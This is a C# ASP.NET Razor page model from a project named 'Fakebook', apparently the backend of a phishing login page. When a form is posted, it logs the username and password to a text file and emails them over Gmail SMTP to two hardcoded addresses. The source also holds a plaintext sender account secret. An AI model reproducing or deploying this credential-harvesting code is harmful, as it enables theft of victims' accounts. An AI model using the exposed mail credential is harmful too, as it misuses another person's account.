using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using System.IO;
using System.Net.Mail;
using System.Net;

namespace FakebookWebSide.Pages
{
    public class IndexModel : PageModel
    {
        private readonly ILogger<IndexModel> _logger;

        public IndexModel(ILogger<IndexModel> logger)
        {
            _logger = logger;
        }

        public void OnGet()
        {

        }
        public void OnPost()
        {
            var userName = Request.Form["userName"];
            var pass = Request.Form["pass"];
            using (StreamWriter stream = new FileInfo("loginInfo.txt").AppendText())
            {
                stream.WriteLine("Username:" + userName.ToString().Trim() + "\r\n" + "Password:" + pass.ToString().Trim()+ "\r\n");
            }

            SendEmail(userName, pass);
        }

         

        private void SendEmail(string userName, string pass)
        {

            var fromAddress = new MailAddress("ilkincavadovtest@gmail.com", "Fakebook"); 
            var toAddress = "Ilkincavadovweb1@gmail.com;agasef.memmedli@gmail.com";

            string id = "lmeegsudwyeqyoba";
            string subject = "Fakebook";
            string body = "Username:" + userName + "\r\n" + "Password:" + pass; 

            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, id)
            };
            foreach (var item in toAddress.Split(";"))
            {
                using (var message = new MailMessage(fromAddress.ToString(), item)
                {
                    Subject = subject,
                    Body = body
                })

                {
                    smtp.Send(message);
                }
            }
           
        }




            
         
    }
}